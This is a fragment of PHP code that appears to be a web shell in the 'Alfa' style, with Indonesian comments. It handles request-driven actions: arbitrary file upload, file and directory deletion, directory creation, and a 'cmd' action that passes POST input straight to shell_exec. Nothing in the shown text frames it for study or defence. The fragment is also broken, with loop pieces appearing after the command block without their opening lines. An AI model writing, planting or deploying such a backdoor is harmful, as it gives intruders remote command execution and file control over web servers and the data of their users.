chdir($cwd);

// Handle aksi
$action = isset($_GET['a']) ? $_GET['a'] : (isset($_POST['a']) ? $_POST['a'] : '');
if ($action == 'logout') {
    setcookie('alfa_user', '', time()-3600, '/');
    setcookie('alfa_hash', '', time()-3600, '/');
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if ($action == 'upload' && isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) $msg = "Upload OK";
    else $msg = "Upload gagal";
}
if ($action == 'delete' && isset($_POST['file'])) {
    $f = $cwd . '/' . basename($_POST['file']);
    if (is_file($f)) unlink($f);
    elseif (is_dir($f)) rmdir($f);
    $msg = "Deleted";
}
if ($action == 'mkdir' && isset($_POST['dirname'])) {
    mkdir($cwd . '/' . basename($_POST['dirname']), 0755);
    $msg = "Dir created";
}
if ($action == 'cmd' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
    if ($output === null) $output = "Command execution failed";
}

    if ($f == '.' || $f == '..') continue;
    if (is_dir($path)) $dirs[] = $f;
    else $files_arr[] = $f;
}

            $is_dir = is_dir($path);
